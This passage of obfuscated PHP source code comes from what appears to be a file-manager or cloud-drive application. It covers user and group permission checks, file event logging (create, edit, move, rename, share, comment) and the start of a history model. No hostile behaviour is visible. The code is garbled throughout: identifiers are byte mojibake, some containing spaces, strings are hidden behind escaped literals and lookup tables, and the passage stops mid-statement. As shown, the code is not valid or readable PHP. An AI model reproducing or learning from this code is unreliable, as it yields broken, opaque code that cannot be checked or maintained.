$ÓñİÍ‚Ü[87] => KodIO::make($×ô›²ô‰[$ÓñİÍ‚Ü[90]][$ÓñİÍ‚Ü[191]]), $ÓñİÍ‚Ü[2401] => $×ô›²ô‰[$ÓñİÍ‚Ü[609]])); } protected function groupRootAuth($ûª”ÔÔÓ, $ ôä§‚ã = false) { $³·şÌ¨Ø =& $_SERVER[©—Ò»ÅĞ]; $ ôä§‚ã = $ ôä§‚ã ? $ ôä§‚ã : USER_ID; $å”Ğüë· = $ ôä§‚ã . $³·şÌ¨Ø[2402] . $ûª”ÔÔÓ; static $Ç¥³¡é— = array(); if (isset($Ç¥³¡é—[$å”Ğüë·])) { return $Ç¥³¡é—[$å”Ğüë·]; } $‚®úÚµ® = Model($³·şÌ¨Ø[605])->getInfo($ûª”ÔÔÓ); $ĞáäµŒƒ = $this->userGroupList($ ôä§‚ã); $æÀ»Ğµ = isset($ĞáäµŒƒ[$ûª”ÔÔÓ]) ? $ĞáäµŒƒ[$ûª”ÔÔÓ][$³·şÌ¨Ø[502]] : !1; if ($æÀ»Ğµ && Model($³·şÌ¨Ø[591])->authCheckAction($æÀ»Ğµ[$³·şÌ¨Ø[502]], $³·şÌ¨Ø[1564])) { $Ç¥³¡é—[$å”Ğüë·] = $æÀ»Ğµ; return $æÀ»Ğµ; } $Ï™†âúâ = $this->sourceAuthSelect($‚®úÚµ®[$³·şÌ¨Ø[90]][$³·şÌ¨Ø[191]]); $¤…Æ„İÚ = $Ï™†âúâ ? $this->authMake($Ï™†âúâ, $ ôä§‚ã) : !1; $şĞ´ÒÊ = $¤…Æ„İÚ ? $¤…Æ„İÚ[$³·şÌ¨Ø[556]] : !1; $Ç¥³¡é—[$å”Ğüë·] = $şĞ´ÒÊ ? $şĞ´ÒÊ : $æÀ»Ğµ; return $Ç¥³¡é—[$å”Ğüë·]; } public function authOwnerApply($˜‡÷Ñ¨) { $Æóï¦È„ =& $_SERVER[©—Ò»ÅĞ]; if (empty($˜‡÷Ñ¨[$Æóï¦È„[502]]) || isset($˜‡÷Ñ¨[$Æóï¦È„[1583]]) && $˜‡÷Ñ¨[$Æóï¦È„[1583]]) { return $˜‡÷Ñ¨; } if (AuthModel::authCheckRoot($˜‡÷Ñ¨[$Æóï¦È„[502]][$Æóï¦È„[503]])) { return $˜‡÷Ñ¨; } $×ÎÂ˜Û = Model($Æóï¦È„[1533])->parentLevelArray($˜‡÷Ñ¨[$Æóï¦È„[604]]); $×ÎÂ˜Û = array_merge(array($˜‡÷Ñ¨[$Æóï¦È„[191]]), array_reverse($×ÎÂ˜Û)); $àÉÒ × = $this->sourceAuthSelect($×ÎÂ˜Û); $†–ôüÇ¾ = array(); $Ù†‚‚¡˜ = array(); foreach ($àÉÒ × as $Ó ïäº => $ß¬Â¼ä’) { $ì¶é®Ù = $this->authFolderOwnerUser($ß¬Â¼ä’); $†–ôüÇ¾[$Ó ïäº] = $ì¶é®Ù; $Ù†‚‚¡˜ = array_merge($Ù†‚‚¡˜, $ì¶é®Ù[$Æóï¦È„[684]]); if ($ì¶é®Ù[$Æóï¦È„[2403]]) { break; } } if (count($Ù†‚‚¡˜) == 0) { $Ù†‚‚¡˜ = $this->authFolderOwnerGroup($˜‡÷Ñ¨[$Æóï¦È„[589]]); } $Ù†‚‚¡˜ = array_unique($Ù†‚‚¡˜); if (AuthModel::authCheckRoot($˜‡÷Ñ¨[$Æóï¦È„[502]][$Æóï¦È„[503]])) { $Ù†‚‚¡˜[] = USER_ID; } $˜‡÷Ñ¨[$Æóï¦È„[502]][$Æóï¦È„[2404]] = Model($Æóï¦È„[597])->userListInfo($Ù†‚‚¡˜); return $˜‡÷Ñ¨; } private function authFolderOwnerGroup($´öü½€ˆ) { $†æÜ·Ï =& $_SERVER[©—Ò»ÅĞ]; $™›Åò¿ = Model($†æÜ·Ï[2277])->where(array($†æÜ·Ï[1495] => $´öü½€ˆ))->select(); $óˆùÄİÓ = array(); if (!$™›Åò¿) { return $óˆùÄİÓ; } foreach ($™›Åò¿ as $Å•ƒûà) { $ ÊîìÓš = $this->authInfo($Å•ƒûà); if (AuthModel::authCheckRoot($ ÊîìÓš[$†æÜ·Ï[502]])) { $óˆùÄİÓ[] = $Å•ƒûà[$†æÜ·Ï[1592]]; } } return $óˆùÄİÓ; } private function authFolderOwnerUser($–íšĞè) { $‰„ƒçß» =& $_SERVER[©—Ò»ÅĞ]; $›ÖŸÉ = array(); $·õ ò¬ = !1; foreach ($–íšĞè as $É—µÉ…®) { $Á­º¦ææ = $this->authInfo($É—µÉ…®); if ($É—µÉ…®[$‰„ƒçß»[589]] == $‰„ƒçß»[228]) { $·õ ò¬ = !0; } if ($É—µÉ…®[$‰„ƒçß»[188]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($Á­º¦ææ[$‰„ƒçß»[502]])) { $›ÖŸÉ[] = $É—µÉ…®[$‰„ƒçß»[589]]; } } } return array($‰„ƒçß»[684] => $›ÖŸÉ, $‰„ƒçß»[2403] => $·õ ò¬); } public function authMake($ó¤µµÊ, $ˆö”•¾á = false) { $”š‹Ì²Á =& $_SERVER[©—Ò»ÅĞ]; $¢¯³¼å = $this->authArrayCheck($ó¤µµÊ, $ˆö”•¾á); if ($¢¯³¼å[$”š‹Ì²Á[2384]]) { $¢¯³¼å[$”š‹Ì²Á[2384]] = $this->sourceAuthInfo($¢¯³¼å[$”š‹Ì²Á[2384]]); } return $¢¯³¼å; } public function authArrayCheck($»ö‹Ïİ, $Ü³ç¤Ì = false) { $²ÜÚ¥Û =& $_SERVER[©—Ò»ÅĞ]; if (!$»ö‹Ïİ) { return array($²ÜÚ¥Û[503] => 0, $²ÜÚ¥Û[556] => !1, $²ÜÚ¥Û[2399] => $²ÜÚ¥Û[12]); } $Ü³ç¤Ì = $Ü³ç¤Ì ? $Ü³ç¤Ì : USER_ID; $şó‘´–± = 0; $¹ÈæÅœ£ = 0; $¦œ¹ßÒ = 0; $–ùıÃ  = 0; $¤¯®‚š¸ = 0; $ÏÓ‡¨Í€ = 0; $Ñ¦ë†Ëú = 0; $²½À²Å = 0; $åô½ıŸ‘ = 1000; $¶šŒ®û¯ = 0; $£ıµú§‰ = 0; $±¯™ÖóÓ = 0; $ûéùÙ€ = 0; $İÁ²¤¿» = 0; foreach ($»ö‹Ïİ as $ŠÅÔøÄî) { $¹’Ÿâö = $this->authInfo($ŠÅÔøÄî); if (!$¹’Ÿâö) { continue; } $ŠÁˆÖ˜Ä = $ŠÅÔøÄî[$²ÜÚ¥Û[589]]; $­ã‡“Æœ = $ŠÅÔøÄî[$²ÜÚ¥Û[191]]; $»şßÑªÉ = intval($¹’Ÿâö[$²ÜÚ¥Û[502]]); if ($ŠÅÔøÄî[$²ÜÚ¥Û[188]] == SourceModel::TYPE_USER && $ŠÁˆÖ˜Ä == $Ü³ç¤Ì) { $şó‘´–± = !0; $¦œ¹ßÒ = $¹’Ÿâö; $¹ÈæÅœ£ = $»şßÑªÉ; $–ùıÃ  = $­ã‡“Æœ; } else { if ($ŠÅÔøÄî[$²ÜÚ¥Û[188]] == SourceModel::TYPE_GROUP && $this->groupContainUser($ŠÁˆÖ˜Ä, $Ü³ç¤Ì)) { $¤¯®‚š¸ = !0; $ƒ¥÷© = $this->groupStepToUserGroup($ŠÁˆÖ˜Ä, $Ü³ç¤Ì); if ($ƒ¥÷© < $åô½ıŸ‘) { $åô½ıŸ‘ = $ƒ¥÷©; $ÏÓ‡¨Í€ = $»şßÑªÉ; $Ñ¦ë†Ëú = $¹’Ÿâö; $¶šŒ®û¯ = $ŠÁˆÖ˜Ä; $²½À²Å = $­ã‡“Æœ; } if ($ƒ¥÷© == $åô½ıŸ‘ && $»şßÑªÉ >= $ÏÓ‡¨Í€) { $ÏÓ‡¨Í€ = $»şßÑªÉ; $Ñ¦ë†Ëú = $¹’Ÿâö; $¶šŒ®û¯ = $ŠÁˆÖ˜Ä; $²½À²Å = $­ã‡“Æœ; } } else { if (!$ŠÁˆÖ˜Ä || $ŠÁˆÖ˜Ä == $²ÜÚ¥Û[228]) { $£ıµú§‰ = !0; $ûéùÙ€ = $¹’Ÿâö; $±¯™ÖóÓ = $»şßÑªÉ; $İÁ²¤¿» = $­ã‡“Æœ; } } } } if ($şó‘´–±) { $¿Ì€¨ìÖ = $¹ÈæÅœ£; $¹’Ÿâö = $¦œ¹ßÒ; $”íÅÎÉ€ = $–ùıÃ ; $íÍ—Ã½´ = LNG($²ÜÚ¥Û[2405]); } else { if ($¤¯®‚š¸) { $¿Ì€¨ìÖ = $ÏÓ‡¨Í€; $¹’Ÿâö = $Ñ¦ë†Ëú; $”íÅÎÉ€ = $²½À²Å; $×èÔ°ôÍ = Model($²ÜÚ¥Û[605])->getInfo($¶šŒ®û¯); $íÍ—Ã½´ = $²ÜÚ¥Û[173] . $×èÔ°ôÍ[$²ÜÚ¥Û[609]] . $²ÜÚ¥Û[2406] . LNG($²ÜÚ¥Û[2407]); } else { if ($£ıµú§‰) { $¿Ì€¨ìÖ = $±¯™ÖóÓ; $¹’Ÿâö = $ûéùÙ€; $”íÅÎÉ€ = $İÁ²¤¿»; $íÍ—Ã½´ = LNG($²ÜÚ¥Û[2386]); } else { $¿Ì€¨ìÖ = 0; $¹’Ÿâö = !1; $íÍ—Ã½´ = $²ÜÚ¥Û[12]; $”íÅÎÉ€ = $²ÜÚ¥Û[12]; } } } $ó°·¢ë­ = array($²ÜÚ¥Û[2398] => intval($¿Ì€¨ìÖ), $²ÜÚ¥Û[2388] => $¹’Ÿâö, $²ÜÚ¥Û[2399] => $íÍ—Ã½´, $²ÜÚ¥Û[2394] => $”íÅÎÉ€); return $ó°·¢ë­; } private function groupContainUser($ùœ­–ƒ, $¯±É¯½ = false) { return in_array($ùœ­–ƒ, $this->userGroupParents($¯±É¯½)); } private function groupStepToUserGroup($Êê‘ºóö, $ú†¤âÖœ = false) { $£ÚšøáÕ =& $_SERVER[©—Ò»ÅĞ]; $ªÒÚš­´ = $this->userGroupList($ú†¤âÖœ); $Ï†´Ô… = 1000; $¬×Ö‘ = $GLOBALS[$£ÚšøáÕ[6]][$£ÚšøáÕ[92]][$£ÚšøáÕ[2290]] == 1; $ËÏš¼¿ = $¬×Ö‘ ? 3 : 2; foreach ($ªÒÚš­´ as $Ô‘ğÍ‘¼) { if ($Ô‘ğÍ‘¼[$£ÚšøáÕ[1495]] == $Êê‘ºóö) { return 0; } $ØÔÈ³èš = explode($£ÚšøáÕ[50], trim($Ô‘ğÍ‘¼[$£ÚšøáÕ[604]], $£ÚšøáÕ[50])); if ($ØÔÈ³èš[0] == $£ÚšøáÕ[228] && count($ØÔÈ³èš) > $ËÏš¼¿) { $ıïª¢å = array_reverse(array_slice($ØÔÈ³èš, $ËÏš¼¿)); $Ì»ÈÖ„š = array_search($Êê‘ºóö, $ıïª¢å); if ($Ì»ÈÖ„š !== !1 && $Ì»ÈÖ„š + 1 <= $Ï†´Ô…) { $Ï†´Ô… = $Ì»ÈÖ„š + 1; } } } return $Ï†´Ô…; } private function userGroupList($´Í¼ºº­ = false, $ë©Ú¦ÚÃ = false) { $Œ ¥¥äı =& $_SERVER[©—Ò»ÅĞ]; static $«¿Çî‘ = array(); if (isset($«¿Çî‘[$´Í¼ºº­])) { return $«¿Çî‘[$´Í¼ºº­]; } if (!$ë©Ú¦ÚÃ) { $ë©Ú¦ÚÃ = Model($Œ ¥¥äı[617])->getInfo($´Í¼ºº­); } $«¿Çî‘[$´Í¼ºº­] = array_to_keyvalue($ë©Ú¦ÚÃ[$Œ ¥¥äı[1494]], $Œ ¥¥äı[1495]); return $«¿Çî‘[$´Í¼ºº­]; } public function userGroupParents($¡”áŞÃø) { $ËÂ÷·Ã =& $_SERVER[©—Ò»ÅĞ]; static $ÊóÌàá‹ = array(); $¡”áŞÃø = $¡”áŞÃø ? $¡”áŞÃø : USER_ID; if (isset($ÊóÌàá‹[$¡”áŞÃø])) { return $ÊóÌàá‹[$¡”áŞÃø]; } $ûûø÷§© = $this->userGroupList($¡”áŞÃø); $ÒŒö¤‹¼ = array(); $†ĞŠÂ˜ = $GLOBALS[$ËÂ÷·Ã[6]][$ËÂ÷·Ã[92]][$ËÂ÷·Ã[2290]] == 1; $ŒùÜÆ›• = $†ĞŠÂ˜ ? 3 : 2; foreach ($ûûø÷§© as $÷Úò„) { $¸¤¡³«· = array($÷Úò„[$ËÂ÷·Ã[1495]]); $Å¸ãÁï = explode($ËÂ÷·Ã[50], trim($÷Úò„[$ËÂ÷·Ã[604]], $ËÂ÷·Ã[50])); if ($Å¸ãÁï[0] == $ËÂ÷·Ã[228] && count($Å¸ãÁï) > $ŒùÜÆ›•) { $Ù«ŞÀ = array_slice($Å¸ãÁï, $ŒùÜÆ›•); $¸¤¡³«· = array_merge($¸¤¡³«·, array_reverse($Ù«ŞÀ)); } $ÒŒö¤‹¼ = array_merge($ÒŒö¤‹¼, $¸¤¡³«·); } $ÊóÌàá‹[$¡”áŞÃø] = array_unique($ÒŒö¤‹¼); return $ÊóÌàá‹[$¡”áŞÃø]; } public function authTargetInfoMake($«ÎÁÅÛÁ) { $”ÆÓñğº =& $_SERVER[©—Ò»ÅĞ]; $ˆ¸ï¼€¥ = array(); $„öÍÉÌ  = array(); foreach ($«ÎÁÅÛÁ as $×óê«é¶) { if ($×óê«é¶[$”ÆÓñğº[188]] == SourceModel::TYPE_USER) { $ˆ¸ï¼€¥[] = intval($×óê«é¶[$”ÆÓñğº[589]]); } else { if ($×óê«é¶[$”ÆÓñğº[188]] == SourceModel::TYPE_GROUP) { $„öÍÉÌ [] = intval($×óê«é¶[$”ÆÓñğº[589]]); } } } if ($ˆ¸ï¼€¥) { $ˆ¸ï¼€¥ = Model($”ÆÓñğº[597])->userListInfo($ˆ¸ï¼€¥); } if ($„öÍÉÌ ) { $ÕùÁÕÂÛ = array($”ÆÓñğº[2270] => array($”ÆÓñğº[507], $„öÍÉÌ )); $„öÍÉÌ  = Model($”ÆÓñğº[605])->field($”ÆÓñğº[2408])->where($ÕùÁÕÂÛ)->select(); $„öÍÉÌ  = array_to_keyvalue($„öÍÉÌ , $”ÆÓñğº[1495]); } return array($”ÆÓñğº[2409] => $ˆ¸ï¼€¥, $”ÆÓñğº[2410] => $„öÍÉÌ ); } public function authInfo($âşŞÈ§‚) { $º®çº± =& $_SERVER[©—Ò»ÅĞ]; if ($âşŞÈ§‚[$º®çº±[1640]]) { $¤Í×§°ï = Model($º®çº±[591])->listData($âşŞÈ§‚[$º®çº±[1640]]); if (!$¤Í×§°ï) { return !1; $šûİ­·Ù = Model($º®çº±[591])->listData(); $í“¬ğ¾˜ = array_filter_by_field($šûİ­·Ù, $º®çº±[502], $º®çº±[228]); return $í“¬ğ¾˜; } $ÍÈû¬ØÒ = array_field_key($¤Í×§°ï, array($º®çº±[487], $º®çº±[32], $º®çº±[502], $º®çº±[2204], $º®çº±[2205])); $ÍÈû¬ØÒ[$º®çº±[2411]] = $âşŞÈ§‚; return $ÍÈû¬ØÒ; } else { return array($º®çº±[508] => 0, $º®çº±[2189] => $âşŞÈ§‚[$º®çº±[2346]], $º®çº±[509] => $º®çº±[12], $º®çº±[2204] => $º®çº±[2412]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\x69\157\137\163\157\165\x72\x63\145\x5f\x65\166\x65\156\164"; protected $dataAuto = array(array("\143\x72\x65\141\x74\x65\x54\151\x6d\145", "\164\x69\x6d\x65", "\151\x6e\163\145\x72\x74", "\146\165\156\143\164\x69\x6f\x6e"), array("\x64\145\x73\x63", '', "\151\156\163\145\162\x74\54\165\x70\144\x61\x74\145\54\x73\145\154\145\143\164", "\152\163\x6f\156")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($øˆÅ¿÷Ï, $Ñ‘æåƒ, $€“ÂÖÎ = '') { $ÎôÙä¬ =& $_SERVER[©—Ò»ÅĞ]; if (!$this->eventSave) { return; } $Û…Ş¸ü = Model($ÎôÙä¬[1533])->sourceInfo($øˆÅ¿÷Ï); if (!$Û…Ş¸ü) { return !1; } if ($this->isDisableEvent($Û…Ş¸ü, $Ñ‘æåƒ)) { return; } if ($€“ÂÖÎ && is_string($€“ÂÖÎ)) { $€“ÂÖÎ = array($ÎôÙä¬[2223] => $€“ÂÖÎ); } $óÑºË Á = KodUser::id(); $’¶Ò¤Ú = array($ÎôÙä¬[506] => $øˆÅ¿÷Ï, $ÎôÙä¬[2413] => $Û…Ş¸ü[$ÎôÙä¬[190]], $ÎôÙä¬[2414] => $Û…Ş¸ü[$ÎôÙä¬[32]], $ÎôÙä¬[602] => !empty($Û…Ş¸ü[$ÎôÙä¬[602]]) ? $Û…Ş¸ü[$ÎôÙä¬[602]] : $ÎôÙä¬[12], $ÎôÙä¬[1969] => $óÑºË Á, $ÎôÙä¬[511] => $Ñ‘æåƒ, $ÎôÙä¬[1971] => $€“ÂÖÎ); $this->addSystemLog($Ñ‘æåƒ, $’¶Ò¤Ú); unset($’¶Ò¤Ú[$ÎôÙä¬[2414]], $’¶Ò¤Ú[$ÎôÙä¬[602]]); return $this->add($’¶Ò¤Ú); } private function addSystemLog($µ…®çŠã, $¬Û£Ô¤ü) { $•İ›µÙô =& $_SERVER[©—Ò»ÅĞ]; if ($µ…®çŠã == $•İ›µÙô[2415]) { $µ…®çŠã = $¬Û£Ô¤ü[$•İ›µÙô[540]][$•İ›µÙô[2416]]; } else { if (in_array($µ…®çŠã, array($•İ›µÙô[1562], $•İ›µÙô[2417]))) { $µ…®çŠã = $¬Û£Ô¤ü[$•İ›µÙô[540]][$•İ›µÙô[168]]; } } $ôø‰“ñŠ = array_merge($¬Û£Ô¤ü, array($•İ›µÙô[2418] => $¬Û£Ô¤ü[$•İ›µÙô[191]], $•İ›µÙô[2419] => $¬Û£Ô¤ü[$•İ›µÙô[2419]])); Hook::trigger($•İ›µÙô[2420], $•İ›µÙô[2421] . $µ…®çŠã, $¬Û£Ô¤ü); Model($•İ›µÙô[2130])->addLog($•İ›µÙô[2421] . $µ…®çŠã, $ôø‰“ñŠ); } private function isDisableEvent($àê„ô÷, $ı¾ÑüÒ¢) { $åß¾£Õ© =& $_SERVER[©—Ò»ÅĞ]; if ($àê„ô÷[$åß¾£Õ©[188]] != SourceModel::TYPE_SYSTEM) { return !1; } if ($ı¾ÑüÒ¢ == $åß¾£Õ©[1334]) { return !1; } return !0; } public function eventCreate($÷¯•‡, $ÛŠ‹±õ¡) { $çØšı =& $_SERVER[©—Ò»ÅĞ]; $¢¡¡ÁİÂ = Model($çØšı[1533])->sourceInfo($÷¯•‡); $Ñç›·ù = array($çØšı[2416] => $ÛŠ‹±õ¡, $çØšı[32] => $¢¡¡ÁİÂ[$çØšı[32]]); return $this->addEvent($÷¯•‡, $çØšı[2415], $Ñç›·ù); } public function eventFileEdit($Ã‚¡¯æŒ) { $İ°í¤àà =& $_SERVER[©—Ò»ÅĞ]; $Ñ„¯¸ËØ = array($İ°í¤àà[2422] => $_SERVER[$İ°í¤àà[2423]], $İ°í¤àà[2424] => strtolower(ACTION)); if (isset($GLOBALS[$İ°í¤àà[7]][$İ°í¤àà[1623]])) { $Ñ„¯¸ËØ[$İ°í¤àà[1623]] = $İ°í¤àà[91]; } return $this->addEvent($Ã‚¡¯æŒ, $İ°í¤àà[1561], $Ñ„¯¸ËØ); } public function eventRecycle($ïÍª„, $¹ù‰ºöò) { return $this->addEvent($ïÍª„, $_SERVER[©—Ò»ÅĞ][2417], $¹ù‰ºöò); } private static $_removeLast = ''; public function eventRemove($»ä‘ùı) { $ï£îô“½ =& $_SERVER[©—Ò»ÅĞ]; self::$_removeLast = $»ä‘ùı; $¿×í™™Ë = Model($ï£îô“½[1533])->sourceInfo($»ä‘ùı); $•Õš™·ì = array_field_key($¿×í™™Ë, array($ï£îô“½[191], $ï£îô“½[557], $ï£îô“½[520], $ï£îô“½[604])); $Äã´êÍÖ = array($ï£îô“½[168] => $¿×í™™Ë[$ï£îô“½[32]], $ï£îô“½[2424] => ACTION, $ï£îô“½[2425] => $•Õš™·ì); return $this->addEvent($¿×í™™Ë[$ï£îô“½[190]], $ï£îô“½[1334], $Äã´êÍÖ); } public function eventShare($îÈÙ«›ú, $ñƒù»ÌĞ) { return $this->addEvent($îÈÙ«›ú, $_SERVER[©—Ò»ÅĞ][1562], $ñƒù»ÌĞ); } public function eventMove($ğ öèşñ, $Õ‰ù±¼ú, $ºŸ„ÓÊ) { $Ô›‚şã =& $_SERVER[©—Ò»ÅĞ]; if (self::$_removeLast == $ğ öèşñ) { return; } $Ñ˜ù·Éá = Model($Ô›‚şã[1533]); $ĞùÇ´§ = $Ñ˜ù·Éá->sourceInfo($ğ öèşñ); $ÛêÌ³ßÆ = $Ñ˜ù·Éá->sourceInfo($Õ‰ù±¼ú); $üéˆîù = $Ñ˜ù·Éá->sourceInfo($ºŸ„ÓÊ); $ü“Ü¢çŞ = array($Ô›‚şã[1346] => $Õ‰ù±¼ú, $Ô›‚şã[2426] => $ÛêÌ³ßÆ[$Ô›‚şã[32]], $Ô›‚şã[2384] => !empty($ÛêÌ³ßÆ[$Ô›‚şã[602]]) ? $ÛêÌ³ßÆ[$Ô›‚şã[602]] : $Ô›‚şã[12], $Ô›‚şã[1347] => $ºŸ„ÓÊ, $Ô›‚şã[2427] => $üéˆîù[$Ô›‚şã[32]], $Ô›‚şã[2428] => !empty($üéˆîù[$Ô›‚şã[602]]) ? $üéˆîù[$Ô›‚şã[602]] : $Ô›‚şã[12]); $this->addEvent($ğ öèşñ, $Ô›‚şã[643], $ü“Ü¢çŞ); $ĞùÇ´§ = $Ñ˜ù·Éá->sourceInfo($ğ öèşñ); $ü“Ü¢çŞ = array($Ô›‚şã[191] => $ĞùÇ´§[$Ô›‚şã[191]], $Ô›‚şã[32] => $ĞùÇ´§[$Ô›‚şã[32]]); $this->addEvent($Õ‰ù±¼ú, $Ô›‚şã[2429], $ü“Ü¢çŞ); } public function eventCopy($»Í¡Ÿ‰) { $this->eventCreate($»Í¡Ÿ‰, $_SERVER[©—Ò»ÅĞ][641]); } public function eventRename($ã’Ô¬‹, $Ûˆ˜‘Áû, $ÂÍµ¦¹Ë) { $Æ‡—Ó‚§ =& $_SERVER[©—Ò»ÅĞ]; $òêß»˜ = array($Æ‡—Ó‚§[1346] => $Ûˆ˜‘Áû, $Æ‡—Ó‚§[1347] => $ÂÍµ¦¹Ë); return $this->addEvent($ã’Ô¬‹, $Æ‡—Ó‚§[1546], $òêß»˜); } public function eventAddComment($·Â„Úæ, $±ºÏÀ©) { return $this->addEvent($·Â„Úæ, $_SERVER[©—Ò»ÅĞ][2430], $±ºÏÀ©); } public function eventAddDesc($”Ï—›Œ›, $ë¯ÅÇÓõ) { return $this->addEvent($”Ï—›Œ›, $_SERVER[©—Ò»ÅĞ][2431], $ë¯ÅÇÓõ); } public function listBySource($ü¾ÜÔ˜Ä) { $äµè¥ş· =& $_SERVER[©—Ò»ÅĞ]; $ş¶ĞÙïî = Model($äµè¥ş·[1533])->sourceInfo($ü¾ÜÔ˜Ä); $àÄË¤È = array($äµè¥ş·[506] => $ü¾ÜÔ˜Ä); if ($ş¶ĞÙïî[$äµè¥ş·[500]] == $äµè¥ş·[91]) { $¤ĞÑ¡şì = 20000; $ÆĞ©”°ã = array($äµè¥ş·[604] => array($äµè¥ş·[473], $ş¶ĞÙïî[$äµè¥ş·[604]] . $ş¶ĞÙïî[$äµè¥ş·[191]] . $äµè¥ş·[636])); $ñ©íìƒÂ = Model($äµè¥ş·[1533])->field($äµè¥ş·[191])->order($äµè¥ş·[2432])->where($ÆĞ©”°ã)->limit($¤ĞÑ¡şì)->select(); $ÉêĞ¢¢¢ = array_to_keyvalue($ñ©íìƒÂ, $äµè¥ş·[12], $äµè¥ş·[191]); if ($ÉêĞ¢¢¢ >= $¤ĞÑ¡şì) { $ô²‡øÈ´ = Model($äµè¥ş·[1533])->listChildrenDeep($ü¾ÜÔ˜Ä, $¤ĞÑ¡şì, 3); $ÉêĞ¢¢¢ = array_merge($ÉêĞ¢¢¢, $ô²‡øÈ´, array($ü¾ÜÔ˜Ä . $äµè¥ş·[463])); } $àÄË¤È = array($äµè¥ş·[191] => array($äµè¥ş·[7], array_unique($ÉêĞ¢¢¢))); } $ŠÎàè¶ = $this->where($àÄË¤È)->order($äµè¥ş·[2433])->selectPage(); if ($ŠÎàè¶[$äµè¥ş·[443]][$äµè¥ş·[444]] == 0) { $ŠÎàè¶[$äµè¥ş·[443]][$äµè¥ş·[444]] = 1; $ŠÎàè¶[$äµè¥ş·[446]] = array(array($äµè¥ş·[506] => $ü¾ÜÔ˜Ä, $äµè¥ş·[2413] => $ş¶ĞÙïî[$äµè¥ş·[190]], $äµè¥ş·[1969] => $ş¶ĞÙïî[$äµè¥ş·[541]], $äµè¥ş·[511] => $äµè¥ş·[2434], $äµè¥ş·[512] => $ş¶ĞÙïî[$äµè¥ş·[231]], $äµè¥ş·[1971] => $äµè¥ş·[12])); } return $this->eventListParse($ŠÎàè¶, $ü¾ÜÔ˜Ä); } private function eventListParse($åã—…, $ÈÙ¸ÏäÒ) { $½ı‹¹¡ö =& $_SERVER[©—Ò»ÅĞ]; $•«†ÔüÀ = $åã—…[$½ı‹¹¡ö[446]]; $Ø¬–ïúò = array_to_keyvalue($•«†ÔüÀ, $½ı‹¹¡ö[12], $½ı‹¹¡ö[191]); $Íó •ğ¢ = array_to_keyvalue($•«†ÔüÀ, $½ı‹¹¡ö[12], $½ı‹¹¡ö[2419]); foreach ($•«†ÔüÀ as $Ñ¶¤İ›Á) { $«ÀÊ³ùÓ = $Ñ¶¤İ›Á[$½ı‹¹¡ö[540]]; if ($Ñ¶¤İ›Á[$½ı‹¹¡ö[33]] == $½ı‹¹¡ö[643] && isset($«ÀÊ³ùÓ[$½ı‹¹¡ö[1346]])) { $Ø¬–ïúò[] = $«ÀÊ³ùÓ[$½ı‹¹¡ö[1346]] . $½ı‹¹¡ö[12]; $Ø¬–ïúò[] = $«ÀÊ³ùÓ[$½ı‹¹¡ö[1347]] . $½ı‹¹¡ö[12]; } if ($Ñ¶¤İ›Á[$½ı‹¹¡ö[33]] == $½ı‹¹¡ö[2429] && isset($«ÀÊ³ùÓ[$½ı‹¹¡ö[191]])) { $Ø¬–ïúò[] = $«ÀÊ³ùÓ[$½ı‹¹¡ö[191]] . $½ı‹¹¡ö[12]; } } $Ø¬–ïúò = array_merge($Ø¬–ïúò, $Íó •ğ¢, array($ÈÙ¸ÏäÒ . $½ı‹¹¡ö[12])); $Ø¬–ïúò = array_unique($Ø¬–ïúò); $±©Úê•ğ = array_unique(array_to_keyvalue($•«†ÔüÀ, $½ı‹¹¡ö[12], $½ı‹¹¡ö[1592])); $íÔ¶ø¢ = Model($½ı‹¹¡ö[617])->userListInfo($±©Úê•ğ); $Õêí²•Ë = Model($½ı‹¹¡ö[933])->sourceListInfo($Ø¬–ïúò, !0); foreach ($•«†ÔüÀ as &$Ñ¶¤İ›Á) { if ($Ñ¶¤İ›Á[$½ı‹¹¡ö[33]] == $½ı‹¹¡ö[643] && isset($Ñ¶¤İ›Á[$½ı‹¹¡ö[540]][$½ı‹¹¡ö[1346]])) { $Ñ¶¤İ›Á[$½ı‹¹¡ö[540]][$½ı‹¹¡ö[1346]] = $Õêí²•Ë[$Ñ¶¤İ›Á[$½ı‹¹¡ö[540]][$½ı‹¹¡ö[1346]]]; $Ñ¶¤İ›Á[$½ı‹¹¡ö[540]][$½ı‹¹¡ö[1347]] = $Õêí²•Ë[$Ñ¶¤İ›Á[$½ı‹¹¡ö[540]][$½ı‹¹¡ö[1347]]]; } if ($Ñ¶¤İ›Á[$½ı‹¹¡ö[33]] == $½ı‹¹¡ö[2429] && isset($Ñ¶¤İ›Á[$½ı‹¹¡ö[540]][$½ı‹¹¡ö[191]])) { $Ñ¶¤İ›Á[$½ı‹¹¡ö[540]][$½ı‹¹¡ö[191]] = $Õêí²•Ë[$Ñ¶¤İ›Á[$½ı‹¹¡ö[540]][$½ı‹¹¡ö[191]]]; } $Ñ¶¤İ›Á[$½ı‹¹¡ö[90]] = $Õêí²•Ë[$Ñ¶¤İ›Á[$½ı‹¹¡ö[191]]]; $Ñ¶¤İ›Á[$½ı‹¹¡ö[2435]] = $Õêí²•Ë[$Ñ¶¤İ›Á[$½ı‹¹¡ö[2419]]]; if ($Ñ¶¤İ›Á[$½ı‹¹¡ö[33]] == $½ı‹¹¡ö[1334]) { $Ñ¶¤İ›Á[$½ı‹¹¡ö[2435]] = $Ñ¶¤İ›Á[$½ı‹¹¡ö[90]]; $Ñ¶¤İ›Á[$½ı‹¹¡ö[2419]] = $Ñ¶¤İ›Á[$½ı‹¹¡ö[2435]][$½ı‹¹¡ö[191]]; $Ñ¶¤İ›Á[$½ı‹¹¡ö[90]] = !1; $Ñ¶¤İ›Á[$½ı‹¹¡ö[191]] = $½ı‹¹¡ö[12]; } $Ñ¶¤İ›Á[$½ı‹¹¡ö[2358]] = $íÔ¶ø¢[$Ñ¶¤İ›Á[$½ı‹¹¡ö[1592]]]; } unset($Ñ¶¤İ›Á); $åã—…[$½ı‹¹¡ö[446]] = $•«†ÔüÀ; return $åã—…; } public function removeBySource($üŠ®ÊóÆ) { $ø²şî¨† = array($_SERVER[©—Ò»ÅĞ][506] => $üŠ®ÊóÆ); $this->where($ø²şî¨†)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\151\x6f\x5f\x73\x6f\165\162\x63\145\x5f\x68\x69\163\x74\157\x72\171"; public function historyCount($à³œ‹œ) { $¾é©ï¯ =& $_SERVER[©—Ò»ÅĞ]; if (!$à³œ‹œ) { return array(); } if (is_string($à³œ‹œ) || 